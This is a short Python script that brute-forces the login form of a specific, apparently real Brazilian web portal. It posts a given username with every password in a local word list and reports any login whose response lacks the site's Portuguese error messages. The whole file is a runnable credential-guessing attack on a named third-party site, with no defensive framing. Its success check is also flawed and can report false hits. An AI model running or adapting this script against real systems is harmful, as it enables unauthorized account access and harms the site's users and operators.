#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
from termcolor import colored

def bruteforce(username, url):
    for password in passwords:
        password = password.strip('\n')
        print(colored("Trying Password: %s" % password, "yellow"))
        dataDict = {"uid":username, "password":password, "Entrar":"submit"}
        response = requests.post(url, data=dataDict)
        print(response.content)
        if b"continue." in response.content:
            print("Recusou a senha {}".format(password))
            pass
        if b"Um erro correu, por favor, fa\xc3\xa7a login novamente atrav\xc3\xa9s da aplica\xc3\xa7\xc3\xa3o." in response.content:
            pass
        else:
            print(colored("[+] Username --> " + username, "green"))
            print(colored("[+] Password --> " + password, "green"))
            exit()

page_url = "https://gdibeta.bpk.com.br"
username = input("Enter Username For Specified Page: ")

with open("pass.txt", "r") as passwords:
    bruteforce(username, page_url)

print(colored("[-] Password Not Found in List", "red"))
